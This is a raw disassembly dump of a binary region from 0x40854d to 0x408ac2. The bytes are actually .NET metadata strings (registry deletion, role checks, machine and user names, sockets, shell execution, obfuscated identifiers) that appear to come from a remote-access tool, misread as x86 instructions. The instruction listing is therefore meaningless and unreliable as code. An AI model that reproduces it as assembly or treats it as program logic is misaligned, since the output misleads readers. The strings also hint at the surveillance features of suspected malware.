  40854d:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408554:	00 43 69             	add    %al,0x69(%ebx)
  408557:	70 68                	jo     0x4085c1
  408559:	65 72 4d             	gs jb  0x4085a9
  40855c:	6f                   	outsl  %ds:(%esi),(%dx)
  40855d:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408562:	6c                   	insb   (%dx),%es:(%edi)
  408563:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  408568:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  40856e:	65 74 65             	gs je  0x4085d6
  408571:	53                   	push   %ebx
  408572:	75 62                	jne    0x4085d6
  408574:	4b                   	dec    %ebx
  408575:	65 79 54             	gs jns 0x4085cc
  408578:	72 65                	jb     0x4085df
  40857a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40857e:	74 5f                	je     0x4085df
  408580:	4d                   	dec    %ebp
  408581:	65 73 73             	gs jae 0x4085f7
  408584:	61                   	popa
  408585:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  40858a:	76 6f                	jbe    0x4085fb
  40858c:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408590:	45                   	inc    %ebp
  408591:	6e                   	outsb  %ds:(%esi),(%dx)
  408592:	75 6d                	jne    0x408601
  408594:	65 72 61             	gs jb  0x4085f8
  408597:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40859b:	49                   	dec    %ecx
  40859c:	44                   	inc    %esp
  40859d:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4085a4:	6c                   	insb   (%dx),%es:(%edi)
  4085a5:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  4085aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4085ab:	75 62                	jne    0x40860f
  4085ad:	6c                   	insb   (%dx),%es:(%edi)
  4085ae:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4085b2:	74 5f                	je     0x408613
  4085b4:	48                   	dec    %eax
  4085b5:	61                   	popa
  4085b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085b7:	64 6c                	fs insb (%dx),%es:(%edi)
  4085b9:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4085be:	74 69                	je     0x408629
  4085c0:	6d                   	insl   (%dx),%es:(%edi)
  4085c1:	65 46                	gs inc %esi
  4085c3:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4085ca:	64 6c                	fs insb (%dx),%es:(%edi)
  4085cc:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085d0:	74 4d                	je     0x40861f
  4085d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d3:	64 75 6c             	fs jne 0x408642
  4085d6:	65 48                	gs dec %eax
  4085d8:	61                   	popa
  4085d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4085da:	64 6c                	fs insb (%dx),%es:(%edi)
  4085dc:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e1:	74 69                	je     0x40864c
  4085e3:	6d                   	insl   (%dx),%es:(%edi)
  4085e4:	65 54                	gs push %esp
  4085e6:	79 70                	jns    0x408658
  4085e8:	65 48                	gs dec %eax
  4085ea:	61                   	popa
  4085eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ec:	64 6c                	fs insb (%dx),%es:(%edi)
  4085ee:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085f2:	74 54                	je     0x408648
  4085f4:	79 70                	jns    0x408666
  4085f6:	65 46                	gs inc %esi
  4085f8:	72 6f                	jb     0x408669
  4085fa:	6d                   	insl   (%dx),%es:(%edi)
  4085fb:	48                   	dec    %eax
  4085fc:	61                   	popa
  4085fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4085fe:	64 6c                	fs insb (%dx),%es:(%edi)
  408600:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408604:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  40860b:	65 
  40860c:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408610:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  408617:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  40861e:	6e 
  40861f:	52                   	push   %edx
  408620:	6f                   	outsl  %ds:(%esi),(%dx)
  408621:	6c                   	insb   (%dx),%es:(%edi)
  408622:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  408626:	6e                   	outsb  %ds:(%esi),(%dx)
  408627:	64 6f                	outsl  %fs:(%esi),(%dx)
  408629:	77 73                	ja     0x40869e
  40862b:	42                   	inc    %edx
  40862c:	75 69                	jne    0x408697
  40862e:	6c                   	insb   (%dx),%es:(%edi)
  40862f:	74 49                	je     0x40867a
  408631:	6e                   	outsb  %ds:(%esi),(%dx)
  408632:	52                   	push   %edx
  408633:	6f                   	outsl  %ds:(%esi),(%dx)
  408634:	6c                   	insb   (%dx),%es:(%edi)
  408635:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408639:	74 5f                	je     0x40869a
  40863b:	4d                   	dec    %ebp
  40863c:	61                   	popa
  40863d:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  408644:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408648:	6f                   	outsl  %ds:(%esi),(%dx)
  408649:	63 65 73             	arpl   %esp,0x73(%ebp)
  40864c:	73 4d                	jae    0x40869b
  40864e:	6f                   	outsl  %ds:(%esi),(%dx)
  40864f:	64 75 6c             	fs jne 0x4086be
  408652:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408656:	74 5f                	je     0x4086b7
  408658:	57                   	push   %edi
  408659:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408660:	79 6c                	jns    0x4086ce
  408662:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408666:	6f                   	outsl  %ds:(%esi),(%dx)
  408667:	63 65 73             	arpl   %esp,0x73(%ebp)
  40866a:	73 57                	jae    0x4086c3
  40866c:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408673:	79 6c                	jns    0x4086e1
  408675:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408679:	74 5f                	je     0x4086da
  40867b:	4e                   	dec    %esi
  40867c:	61                   	popa
  40867d:	6d                   	insl   (%dx),%es:(%edi)
  40867e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408682:	74 5f                	je     0x4086e3
  408684:	46                   	inc    %esi
  408685:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40868c:	00 
  40868d:	73 65                	jae    0x4086f4
  40868f:	74 5f                	je     0x4086f0
  408691:	46                   	inc    %esi
  408692:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408699:	00 
  40869a:	47                   	inc    %edi
  40869b:	65 74 54             	gs je  0x4086f2
  40869e:	65 6d                	gs insl (%dx),%es:(%edi)
  4086a0:	70 46                	jo     0x4086e8
  4086a2:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086a9:	00 
  4086aa:	47                   	inc    %edi
  4086ab:	65 74 46             	gs je  0x4086f4
  4086ae:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086b5:	00 
  4086b6:	67 65 74 5f          	addr16 gs je 0x408719
  4086ba:	4d                   	dec    %ebp
  4086bb:	61                   	popa
  4086bc:	63 68 69             	arpl   %ebp,0x69(%eax)
  4086bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c0:	65 4e                	gs dec %esi
  4086c2:	61                   	popa
  4086c3:	6d                   	insl   (%dx),%es:(%edi)
  4086c4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086c8:	74 5f                	je     0x408729
  4086ca:	4f                   	dec    %edi
  4086cb:	53                   	push   %ebx
  4086cc:	46                   	inc    %esi
  4086cd:	75 6c                	jne    0x40873b
  4086cf:	6c                   	insb   (%dx),%es:(%edi)
  4086d0:	4e                   	dec    %esi
  4086d1:	61                   	popa
  4086d2:	6d                   	insl   (%dx),%es:(%edi)
  4086d3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086d7:	74 5f                	je     0x408738
  4086d9:	46                   	inc    %esi
  4086da:	75 6c                	jne    0x408748
  4086dc:	6c                   	insb   (%dx),%es:(%edi)
  4086dd:	4e                   	dec    %esi
  4086de:	61                   	popa
  4086df:	6d                   	insl   (%dx),%es:(%edi)
  4086e0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086e4:	74 5f                	je     0x408745
  4086e6:	55                   	push   %ebp
  4086e7:	73 65                	jae    0x40874e
  4086e9:	72 4e                	jb     0x408739
  4086eb:	61                   	popa
  4086ec:	6d                   	insl   (%dx),%es:(%edi)
  4086ed:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  4086f1:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  4086f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f6:	73 74                	jae    0x40876c
  4086f8:	4e                   	dec    %esi
  4086f9:	61                   	popa
  4086fa:	6d                   	insl   (%dx),%es:(%edi)
  4086fb:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408700:	65 54                	gs push %esp
  408702:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408709:	5f                   	pop    %edi
  40870a:	4c                   	dec    %esp
  40870b:	61                   	popa
  40870c:	73 74                	jae    0x408782
  40870e:	57                   	push   %edi
  40870f:	72 69                	jb     0x40877a
  408711:	74 65                	je     0x408778
  408713:	54                   	push   %esp
  408714:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  40871b:	6e                   	outsb  %ds:(%esi),(%dx)
  40871c:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408723:	54                   	push   %esp
  408724:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  40872b:	74 65                	je     0x408792
  40872d:	4c                   	dec    %esp
  40872e:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408735:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408738:	65 00 78 51          	add    %bh,%gs:0x51(%eax)
  40873c:	64 68 6c 6b 54 6c    	fs push $0x6c546b6c
  408742:	6f                   	outsl  %ds:(%esi),(%dx)
  408743:	43                   	inc    %ebx
  408744:	75 70                	jne    0x4087b6
  408746:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40874a:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408751:	6d                   	insl   (%dx),%es:(%edi)
  408752:	65 54                	gs push %esp
  408754:	79 70                	jns    0x4087c6
  408756:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40875a:	74 5f                	je     0x4087bb
  40875c:	56                   	push   %esi
  40875d:	61                   	popa
  40875e:	6c                   	insb   (%dx),%es:(%edi)
  40875f:	75 65                	jne    0x4087c6
  408761:	54                   	push   %esp
  408762:	79 70                	jns    0x4087d4
  408764:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408768:	6f                   	outsl  %ds:(%esi),(%dx)
  408769:	74 6f                	je     0x4087da
  40876b:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40876e:	54                   	push   %esp
  40876f:	79 70                	jns    0x4087e1
  408771:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408775:	74 54                	je     0x4087cb
  408777:	79 70                	jns    0x4087e9
  408779:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40877d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408780:	74 54                	je     0x4087d6
  408782:	79 70                	jns    0x4087f4
  408784:	65 00 61 62          	add    %ah,%gs:0x62(%ecx)
  408788:	4c                   	dec    %esp
  408789:	4b                   	dec    %ebx
  40878a:	47                   	inc    %edi
  40878b:	4c                   	dec    %esp
  40878c:	50                   	push   %eax
  40878d:	68 76 71 65 00       	push   $0x657176
  408792:	46                   	inc    %esi
  408793:	69 6c 65 53 68 61 72 	imul   $0x65726168,0x53(%ebp,%eiz,2),%ebp
  40879a:	65 
  40879b:	00 53 79             	add    %dl,0x79(%ebx)
  40879e:	73 74                	jae    0x408814
  4087a0:	65 6d                	gs insl (%dx),%es:(%edi)
  4087a2:	2e 43                	cs inc %ebx
  4087a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a5:	72 65                	jb     0x40880c
  4087a7:	00 62 66             	add    %ah,0x66(%edx)
  4087aa:	45                   	inc    %ebp
  4087ab:	55                   	push   %ebp
  4087ac:	54                   	push   %esp
  4087ad:	68 65 70 72 65       	push   $0x65727065
  4087b2:	00 43 6c             	add    %al,0x6c(%ebx)
  4087b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b6:	73 65                	jae    0x40881d
  4087b8:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4087bc:	70 6f                	jo     0x40882d
  4087be:	73 65                	jae    0x408825
  4087c0:	00 50 61             	add    %dl,0x61(%eax)
  4087c3:	72 73                	jb     0x408838
  4087c5:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4087c9:	72 52                	jb     0x40881d
  4087cb:	65 76 65             	gs jbe 0x408833
  4087ce:	72 73                	jb     0x408843
  4087d0:	65 00 4c 49 66       	add    %cl,%gs:0x66(%ecx,%ecx,2)
  4087d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4087d6:	53                   	push   %ebx
  4087d7:	6d                   	insl   (%dx),%es:(%edi)
  4087d8:	54                   	push   %esp
  4087d9:	6d                   	insl   (%dx),%es:(%edi)
  4087da:	4c                   	dec    %esp
  4087db:	74 65                	je     0x408842
  4087dd:	00 58 35             	add    %bl,0x35(%eax)
  4087e0:	30 39                	xor    %bh,(%ecx)
  4087e2:	43                   	inc    %ebx
  4087e3:	65 72 74             	gs jb  0x40885a
  4087e6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4087ed:	00 43 72             	add    %al,0x72(%ebx)
  4087f0:	65 61                	gs popa
  4087f2:	74 65                	je     0x408859
  4087f4:	00 53 65             	add    %dl,0x65(%ebx)
  4087f7:	74 54                	je     0x40884d
  4087f9:	68 72 65 61 64       	push   $0x64616572
  4087fe:	45                   	inc    %ebp
  4087ff:	78 65                	js     0x408866
  408801:	63 75 74             	arpl   %esi,0x74(%ebp)
  408804:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40880b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408810:	65 74 65             	gs je  0x408878
  408813:	00 43 61             	add    %al,0x61(%ebx)
  408816:	6c                   	insb   (%dx),%es:(%edi)
  408817:	6c                   	insb   (%dx),%es:(%edi)
  408818:	53                   	push   %ebx
  408819:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408820:	74 
  408821:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408825:	6d                   	insl   (%dx),%es:(%edi)
  408826:	70 69                	jo     0x408891
  408828:	6c                   	insb   (%dx),%es:(%edi)
  408829:	65 72 47             	gs jb  0x408873
  40882c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40882e:	65 72 61             	gs jb  0x408892
  408831:	74 65                	je     0x408898
  408833:	64 41                	fs inc %ecx
  408835:	74 74                	je     0x4088ab
  408837:	72 69                	jb     0x4088a2
  408839:	62 75 74             	bound  %esi,0x74(%ebp)
  40883c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408841:	75 67                	jne    0x4088aa
  408843:	67 61                	addr16 popa
  408845:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408849:	74 74                	je     0x4088bf
  40884b:	72 69                	jb     0x4088b6
  40884d:	62 75 74             	bound  %esi,0x74(%ebp)
  408850:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408854:	6d                   	insl   (%dx),%es:(%edi)
  408855:	56                   	push   %esi
  408856:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40885d:	74 74                	je     0x4088d3
  40885f:	72 69                	jb     0x4088ca
  408861:	62 75 74             	bound  %esi,0x74(%ebp)
  408864:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408868:	73 65                	jae    0x4088cf
  40886a:	6d                   	insl   (%dx),%es:(%edi)
  40886b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40886f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408876:	72 
  408877:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40887e:	73 73                	jae    0x4088f3
  408880:	65 6d                	gs insl (%dx),%es:(%edi)
  408882:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408886:	72 61                	jb     0x4088e9
  408888:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40888b:	61                   	popa
  40888c:	72 6b                	jb     0x4088f9
  40888e:	41                   	inc    %ecx
  40888f:	74 74                	je     0x408905
  408891:	72 69                	jb     0x4088fc
  408893:	62 75 74             	bound  %esi,0x74(%ebp)
  408896:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40889b:	67 65 74 46          	addr16 gs je 0x4088e5
  40889f:	72 61                	jb     0x408902
  4088a1:	6d                   	insl   (%dx),%es:(%edi)
  4088a2:	65 77 6f             	gs ja  0x408914
  4088a5:	72 6b                	jb     0x408912
  4088a7:	41                   	inc    %ecx
  4088a8:	74 74                	je     0x40891e
  4088aa:	72 69                	jb     0x408915
  4088ac:	62 75 74             	bound  %esi,0x74(%ebp)
  4088af:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088b3:	73 65                	jae    0x40891a
  4088b5:	6d                   	insl   (%dx),%es:(%edi)
  4088b6:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4088ba:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4088c1:	69 
  4088c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c4:	41                   	inc    %ecx
  4088c5:	74 74                	je     0x40893b
  4088c7:	72 69                	jb     0x408932
  4088c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4088cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088d0:	73 65                	jae    0x408937
  4088d2:	6d                   	insl   (%dx),%es:(%edi)
  4088d3:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4088d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4088d9:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4088df:	74 69                	je     0x40894a
  4088e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e3:	41                   	inc    %ecx
  4088e4:	74 74                	je     0x40895a
  4088e6:	72 69                	jb     0x408951
  4088e8:	62 75 74             	bound  %esi,0x74(%ebp)
  4088eb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088ef:	73 65                	jae    0x408956
  4088f1:	6d                   	insl   (%dx),%es:(%edi)
  4088f2:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4088f6:	65 73 63             	gs jae 0x40895c
  4088f9:	72 69                	jb     0x408964
  4088fb:	70 74                	jo     0x408971
  4088fd:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408904:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40890b:	65 66 61             	gs popaw
  40890e:	75 6c                	jne    0x40897c
  408910:	74 4d                	je     0x40895f
  408912:	65 6d                	gs insl (%dx),%es:(%edi)
  408914:	62 65 72             	bound  %esp,0x72(%ebp)
  408917:	41                   	inc    %ecx
  408918:	74 74                	je     0x40898e
  40891a:	72 69                	jb     0x408985
  40891c:	62 75 74             	bound  %esi,0x74(%ebp)
  40891f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408923:	6d                   	insl   (%dx),%es:(%edi)
  408924:	70 69                	jo     0x40898f
  408926:	6c                   	insb   (%dx),%es:(%edi)
  408927:	61                   	popa
  408928:	74 69                	je     0x408993
  40892a:	6f                   	outsl  %ds:(%esi),(%dx)
  40892b:	6e                   	outsb  %ds:(%esi),(%dx)
  40892c:	52                   	push   %edx
  40892d:	65 6c                	gs insb (%dx),%es:(%edi)
  40892f:	61                   	popa
  408930:	78 61                	js     0x408993
  408932:	74 69                	je     0x40899d
  408934:	6f                   	outsl  %ds:(%esi),(%dx)
  408935:	6e                   	outsb  %ds:(%esi),(%dx)
  408936:	73 41                	jae    0x408979
  408938:	74 74                	je     0x4089ae
  40893a:	72 69                	jb     0x4089a5
  40893c:	62 75 74             	bound  %esi,0x74(%ebp)
  40893f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408943:	73 65                	jae    0x4089aa
  408945:	6d                   	insl   (%dx),%es:(%edi)
  408946:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40894a:	72 6f                	jb     0x4089bb
  40894c:	64 75 63             	fs jne 0x4089b2
  40894f:	74 41                	je     0x408992
  408951:	74 74                	je     0x4089c7
  408953:	72 69                	jb     0x4089be
  408955:	62 75 74             	bound  %esi,0x74(%ebp)
  408958:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40895c:	73 65                	jae    0x4089c3
  40895e:	6d                   	insl   (%dx),%es:(%edi)
  40895f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408963:	6f                   	outsl  %ds:(%esi),(%dx)
  408964:	70 79                	jo     0x4089df
  408966:	72 69                	jb     0x4089d1
  408968:	67 68 74 41 74 74    	addr16 push $0x74744174
  40896e:	72 69                	jb     0x4089d9
  408970:	62 75 74             	bound  %esi,0x74(%ebp)
  408973:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408977:	73 65                	jae    0x4089de
  408979:	6d                   	insl   (%dx),%es:(%edi)
  40897a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40897e:	6f                   	outsl  %ds:(%esi),(%dx)
  40897f:	6d                   	insl   (%dx),%es:(%edi)
  408980:	70 61                	jo     0x4089e3
  408982:	6e                   	outsb  %ds:(%esi),(%dx)
  408983:	79 41                	jns    0x4089c6
  408985:	74 74                	je     0x4089fb
  408987:	72 69                	jb     0x4089f2
  408989:	62 75 74             	bound  %esi,0x74(%ebp)
  40898c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408990:	6e                   	outsb  %ds:(%esi),(%dx)
  408991:	74 69                	je     0x4089fc
  408993:	6d                   	insl   (%dx),%es:(%edi)
  408994:	65 43                	gs inc %ebx
  408996:	6f                   	outsl  %ds:(%esi),(%dx)
  408997:	6d                   	insl   (%dx),%es:(%edi)
  408998:	70 61                	jo     0x4089fb
  40899a:	74 69                	je     0x408a05
  40899c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40899f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4089a6:	69 
  4089a7:	62 75 74             	bound  %esi,0x74(%ebp)
  4089aa:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4089ae:	74 5f                	je     0x408a0f
  4089b0:	55                   	push   %ebp
  4089b1:	73 65                	jae    0x408a18
  4089b3:	53                   	push   %ebx
  4089b4:	68 65 6c 6c 45       	push   $0x456c6c65
  4089b9:	78 65                	js     0x408a20
  4089bb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089be:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4089c2:	61                   	popa
  4089c3:	64 42                	fs inc %edx
  4089c5:	79 74                	jns    0x408a3b
  4089c7:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4089cb:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4089d2:	00 
  4089d3:	44                   	inc    %esp
  4089d4:	65 6c                	gs insb (%dx),%es:(%edi)
  4089d6:	65 74 65             	gs je  0x408a3e
  4089d9:	56                   	push   %esi
  4089da:	61                   	popa
  4089db:	6c                   	insb   (%dx),%es:(%edi)
  4089dc:	75 65                	jne    0x408a43
  4089de:	00 47 65             	add    %al,0x65(%edi)
  4089e1:	74 56                	je     0x408a39
  4089e3:	61                   	popa
  4089e4:	6c                   	insb   (%dx),%es:(%edi)
  4089e5:	75 65                	jne    0x408a4c
  4089e7:	00 53 65             	add    %dl,0x65(%ebx)
  4089ea:	74 56                	je     0x408a42
  4089ec:	61                   	popa
  4089ed:	6c                   	insb   (%dx),%es:(%edi)
  4089ee:	75 65                	jne    0x408a55
  4089f0:	00 61 47             	add    %ah,0x47(%ecx)
  4089f3:	53                   	push   %ebx
  4089f4:	54                   	push   %esp
  4089f5:	66 6b 41 48 76       	imul   $0x76,0x48(%ecx),%ax
  4089fa:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4089fe:	74 5f                	je     0x408a5f
  408a00:	4b                   	dec    %ebx
  408a01:	65 65 70 41          	gs gs jo 0x408a46
  408a05:	6c                   	insb   (%dx),%es:(%edi)
  408a06:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a0d:	5f                   	pop    %edi
  408a0e:	4b                   	dec    %ebx
  408a0f:	65 65 70 41          	gs gs jo 0x408a54
  408a13:	6c                   	insb   (%dx),%es:(%edi)
  408a14:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1c:	76 65                	jbe    0x408a83
  408a1e:	00 73 65             	add    %dh,0x65(%ebx)
  408a21:	74 5f                	je     0x408a82
  408a23:	42                   	inc    %edx
  408a24:	6c                   	insb   (%dx),%es:(%edi)
  408a25:	6f                   	outsl  %ds:(%esi),(%dx)
  408a26:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408a29:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a30:	5f                   	pop    %edi
  408a31:	54                   	push   %esp
  408a32:	6f                   	outsl  %ds:(%esi),(%dx)
  408a33:	74 61                	je     0x408a96
  408a35:	6c                   	insb   (%dx),%es:(%edi)
  408a36:	53                   	push   %ebx
  408a37:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a3e:	5f                   	pop    %edi
  408a3f:	48                   	dec    %eax
  408a40:	65 61                	gs popa
  408a42:	64 65 72 53          	fs gs jb 0x408a99
  408a46:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a4d:	5f                   	pop    %edi
  408a4e:	48                   	dec    %eax
  408a4f:	65 61                	gs popa
  408a51:	64 65 72 53          	fs gs jb 0x408aa8
  408a55:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a5c:	5f                   	pop    %edi
  408a5d:	53                   	push   %ebx
  408a5e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a60:	64 42                	fs inc %edx
  408a62:	75 66                	jne    0x408aca
  408a64:	66 65 72 53          	data16 gs jb 0x408abb
  408a68:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a6f:	5f                   	pop    %edi
  408a70:	52                   	push   %edx
  408a71:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408a75:	76 65                	jbe    0x408adc
  408a77:	42                   	inc    %edx
  408a78:	75 66                	jne    0x408ae0
  408a7a:	66 65 72 53          	data16 gs jb 0x408ad1
  408a7e:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a85:	5f                   	pop    %edi
  408a86:	4b                   	dec    %ebx
  408a87:	65 79 53             	gs jns 0x408add
  408a8a:	69 7a 65 00 6e 54 65 	imul   $0x65546e00,0x65(%edx),%edi
  408a91:	69 42 65 74 54 70 46 	imul   $0x46705474,0x65(%edx),%eax
  408a98:	43                   	inc    %ebx
  408a99:	4a                   	dec    %edx
  408a9a:	66 00 70 47          	data16 add %dh,0x47(%eax)
  408a9e:	68 4f 6c 5a 54       	push   $0x545a6c4f
  408aa3:	6c                   	insb   (%dx),%es:(%edi)
  408aa4:	59                   	pop    %ecx
  408aa5:	62 57 4c             	bound  %edx,0x4c(%edi)
  408aa8:	46                   	inc    %esi
  408aa9:	4d                   	dec    %ebp
  408aaa:	66 00 6f 73          	data16 add %ch,0x73(%edi)
  408aae:	66 6a 67             	pushw  $0x67
  408ab1:	5a                   	pop    %edx
  408ab2:	46                   	inc    %esi
  408ab3:	55                   	push   %ebp
  408ab4:	44                   	inc    %esp
  408ab5:	48                   	dec    %eax
  408ab6:	54                   	push   %esp
  408ab7:	66 00 52 6c          	data16 add %dl,0x6c(%edx)
  408abb:	41                   	inc    %ecx
  408abc:	78 51                	js     0x408b0f
  408abe:	4b                   	dec    %ebx
  408abf:	46                   	inc    %esi
  408ac0:	74 77                	je     0x408b39
  408ac2:	71 70                	jno    0x408b34
